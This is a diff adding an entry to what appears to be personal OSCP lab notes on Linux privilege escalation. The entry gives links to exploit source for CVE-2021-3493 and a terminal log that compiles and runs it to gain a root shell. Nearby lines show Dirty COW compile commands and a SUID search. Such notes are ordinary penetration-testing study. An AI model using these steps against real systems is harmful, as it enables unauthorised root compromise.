@@ -531,6 +531,20 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 ```
 
+Ubuntu 20 5.11 - CVE-2021-3493
+```bash
+https://bestofcpp.com/repo/inspiringz-CVE-2021-3493-cpp-cryptography
+
+https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
+root@kali:/OSCPv3/offsec_pg/SoSimple# gcc -m64 exploit.c -o exploit
+root@kali:/OSCPv3/offsec_pg/SoSimple#
+max@so-simple:/tmp$ ./exploit
+bash-5.0# whoami
+root
+bash-5.0# 
+```
+
+	
 ### SUID
 ```bash
 $ find / -perm -u=s -type f 2>/dev/null
